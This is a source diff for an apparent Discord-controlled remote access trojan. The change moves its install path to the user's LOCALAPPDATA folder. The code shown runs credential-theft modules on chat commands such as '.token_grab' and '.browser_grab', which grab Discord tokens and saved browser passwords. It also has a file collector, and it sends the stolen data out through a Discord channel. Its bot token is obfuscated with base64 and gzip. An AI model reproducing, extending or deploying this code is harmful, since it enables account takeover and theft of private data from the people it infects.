@@ -13,14 +13,17 @@ import requests
 import time
 import ctypes
 
-modules_path = os.getcwd() + "\modules"
+main_path = os.getenv("LOCALAPPDATA") + "Snky\Snky-main"
+modules_path = main_path + "\modules"
 client = discord.Client(intents=discord.Intents.all())
 file_version = "2.0"
+
+
 
 FILE_ATTRIBUTE_HIDDEN = 0x02
 
 #load config
-with open(f"{os.getcwd()}/cfg/config.json", "r") as f:
+with open(f"{main_path}/cfg/config.json", "r") as f:
         config = json.load(f)
 
 def load_modules():
@@ -482,7 +485,7 @@ async def on_message(message):
     if message.content.startswith(".file_collector"):
         await message.delete()
         #run file_collector.pyw and wait until finished then send collected_files.zip
-        os.system(f"py {os.getcwd()}\\built_in_modules\\file_collector.pyw")
+        os.system(f"py {main_path}\\built_in_modules\\file_collector.pyw")
 
         embed = discord.Embed(title="File Collector", description="File collector executed.\nNOTE: If you have enabled image collection, .zip file size may be too big to send!", color=0x00ff00)
         await message.channel.send(embed=embed)
@@ -496,35 +499,35 @@ async def on_message(message):
     if message.content.startswith(".token_grab"):
         await message.delete()
         #run token_grabber.pyw and wait until finished then send token.txt
-        os.system(f"py {os.getcwd()}\\built_in_modules\\discord_token_grabber.pyw")
+        os.system(f"py {main_path}\\built_in_modules\\discord_token_grabber.pyw")
 
         embed = discord.Embed(title="Token Grabber", description="Token grabber executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
-        while(os.path.exists(f"{os.getcwd()}\\token.txt") == False):
+        while(os.path.exists(f"{main_path}\\token.txt") == False):
             time.sleep(1)
 
-        with open(f"{os.getcwd()}\\token.txt", "r") as f:
+        with open(f"{main_path}\\token.txt", "r") as f:
             token = f.read()
         
         embed = discord.Embed(title="Token Grabber", description=f"{token}", color=0x00ff00)
         await message.channel.send(embed=embed)
-        os.remove(f"{os.getcwd()}\\token.txt")
+        os.remove(f"{main_path}\\token.txt")
         
     if message.content.startswith(".browser_grab"):
         await message.delete()
         #run token_grabber.pyw and wait until finished then send token.txt
-        os.system(f"py {os.getcwd()}\\built_in_modules\\browser_psw.pyw")
+        os.system(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
 
         embed = discord.Embed(title="Token Grabber", description="Browser grabber executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
-        while(os.path.exists(f"{os.getcwd()}\\browsers") == False):
+        while(os.path.exists(f"{main_path}\\browsers") == False):
             time.sleep(1)
 
-        make_archive("browsers", "zip", f"{os.getcwd()}\\browsers")
-        await message.channel.send(file=discord.File(f"{os.getcwd()}\\browsers.zip"))
-        os.remove(f"{os.getcwd()}\\browsers.zip")
-        os.remove(f"{os.getcwd()}\\browsers")
+        make_archive("browsers", "zip", f"{main_path}\\browsers")
+        await message.channel.send(file=discord.File(f"{main_path}\\browsers.zip"))
+        os.remove(f"{main_path}\\browsers.zip")
+        os.remove(f"{main_path}\\browsers")
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
